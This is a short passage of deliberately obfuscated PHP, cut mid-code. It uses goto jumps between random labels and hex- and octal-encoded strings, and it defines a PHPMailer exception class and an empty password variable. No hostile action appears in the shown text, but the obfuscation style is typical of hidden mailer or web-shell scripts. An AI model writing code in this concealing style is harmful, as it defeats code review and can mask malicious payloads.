"\x73\x65\x6c\x65\143\x74\x65\x64"; } else { $bit8 = "\163\145\x6c\145\143\x74\145\144"; } } goto II6vt; VE8bm: class phpmailerException extends Exception { public function errorMessage() { $errorMsg = "\x3c\x73\164\x72\157\x6e\x67\x3e" . htmlspecialchars($this->getMessage()) . "\x3c\x2f\x73\164\x72\157\156\x67\x3e\74\x62\162\x20\x2f\x3e\12"; return $errorMsg; } } goto FjfTp; gZ20M: $password = ''; goto VduuB; Jgf43: ?>